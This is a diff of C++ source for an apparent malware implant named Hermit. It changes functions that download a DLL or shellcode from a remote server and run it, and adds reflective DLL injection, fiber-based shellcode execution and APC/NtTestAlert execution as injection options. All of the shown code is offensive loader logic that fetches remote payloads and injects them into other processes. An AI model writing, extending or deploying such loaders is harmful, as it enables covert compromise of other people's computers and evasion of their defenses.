@@ -58,7 +58,7 @@ namespace Hermit
         std::wstring dllPath = System::Env::GetStrings(L"%TEMP%") + L"\\" + dllFileName;
         size_t dwDllPathSize = (dllPath.size() + 1) * sizeof(wchar_t);
 
-        // Download a DLL file
+        // Download a DLL file (create a file)
         bResults = System::Http::WriteResponseData(pProcs, hRequest, dllPath);
         if (!bResults)
         {
@@ -67,13 +67,18 @@ namespace Hermit
         }
         System::Http::WinHttpCloseHandles(pProcs, hSession, hConnect, hRequest);
 
-        // Get target PID to inject DLL
-        DWORD dwPid = System::Process::GetProcessIdByName(TEXT(PAYLOAD_PROCESS));
+        // Target PID
+        DWORD dwPID;
 
         // Inject DLL
         if (strcmp(PAYLOAD_TECHNIQUE, "dll-injection") == 0)
         {
-            Technique::Injection::DllInjection(dwPid, (LPVOID)dllPath.c_str(), dwDllPathSize);
+            dwPID = System::Process::GetProcessIdByName(TEXT(PAYLOAD_PROCESS_TO_INJECT));
+            Technique::Injection::DLLInjection(dwPID, (LPVOID)dllPath.c_str(), dwDllPathSize);
+        }
+        else if (strcmp(PAYLOAD_TECHNIQUE, "reflective-dll-injection") == 0)
+        {
+            Technique::Injection::ReflectiveDLLInjection(dllPath.c_str(), dwDllPathSize);
         }
 
         Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
@@ -154,7 +159,7 @@ namespace Hermit
 
     VOID ShellcodeLoader()
     {
-        // Load modules for dynamac API resolution.     
+        // Load modules for dynamac API resolution.
         HMODULE hWinHTTPDLL = LoadLibrary(L"winhttp.dll");
         if (!hWinHTTPDLL)
             return;
@@ -210,13 +215,22 @@ namespace Hermit
             return;
         }
 
-        // Get target PID to inject DLL
-        DWORD dwPid = System::Process::GetProcessIdByName(TEXT(PAYLOAD_PROCESS));
+        // Target PID
+        DWORD dwPID;
 
         // Inject shellcode
         if (strcmp(PAYLOAD_TECHNIQUE, "shellcode-injection") == 0)
         {
-            Technique::Injection::ShellcodeInjection(dwPid, respBytes);
+            dwPID = System::Process::GetProcessIdByName(TEXT(PAYLOAD_PROCESS_TO_INJECT));
+            Technique::Injection::ShellcodeInjection(dwPID, respBytes);
+        }
+        else if (strcmp(PAYLOAD_TECHNIQUE, "shellcode-execution-via-fibers") == 0)
+        {
+            Technique::Injection::ShellcodeExecutionViaFibers(respBytes);
+        }
+        else if (strcmp(PAYLOAD_TECHNIQUE, "shellcode-execution-via-apc-and-nttestalert") == 0)
+        {
+            Technique::Injection::ShellcodeExecutionViaAPCAndNtTestAlert(respBytes);
         }
 
         Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
